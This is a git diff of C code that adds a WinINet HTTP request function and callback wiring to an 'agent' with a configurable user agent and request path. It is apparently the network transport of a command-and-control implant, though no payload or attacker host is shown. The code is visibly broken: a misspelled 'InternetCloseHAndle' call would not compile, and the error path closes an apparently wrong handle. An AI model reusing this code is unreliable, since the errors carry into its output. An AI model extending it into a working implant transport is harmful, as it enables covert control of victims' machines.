@@ -1,9 +1,13 @@
 #include "agent.h"
 #include <wininet.h>
 
+// Initialies UserAgent & the connection to the server
+// which is then subsequentially passed to the Open
+// Network Server. I think I might need to change InternetConnectA
+// to wininet_request(), off memory...
 INT wininet_init(struct Cobol *c)
 {
-    HANDLE hInternet = InternetOpenA(&c->Config->UserAgent,
+    HANDLE hInternet = InternetOpenA((PCHAR)&c->Config->UserAgent,
 	INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if(hInternet != NULL)
     {
@@ -20,8 +24,28 @@ INT wininet_init(struct Cobol *c)
     return 1;
 }
 
+// 90% feel like I'm going to change this, but, we'll see. Probably
+// to include HTTPS & Fix up some other stuff & add header parsing
+// etc.
+// Currently opens an request to the path defined in Configuration.
+// using wininet's HttpOpenRequestA()
+PVOID wininet_request(struct Cobol *c, BOOL Method)
+{
+    HANDLE hNetworkRequest = HttpOpenRequestA(c->HttpTransport->hInternetConnection, Method ? "GET" : "POST",
+	(PCHAR)&c->Config->Path, NULL, NULL, NULL,
+	INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_NO_UI |INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS, 0);
+    if(hNetworkRequest == NULL)
+    {
+	InternetCloseHandle(c->HttpTransport->hInternetConfig);
+	InternetCloseHAndle(c->HttpTransport->hInternetConnection);
+	return NULL;
+    }
+    return hNetworkRequest;
+}
+
 VOID WininetConfigureCallback(struct Cobol *c)
 {
-    c->HttpTransport->init = (void *)wininet_init;
+    c->HttpTransport->init    = (void *)wininet_init;
+    c->HttpTransport->request = (void *)wininet_request;
     return;
 }
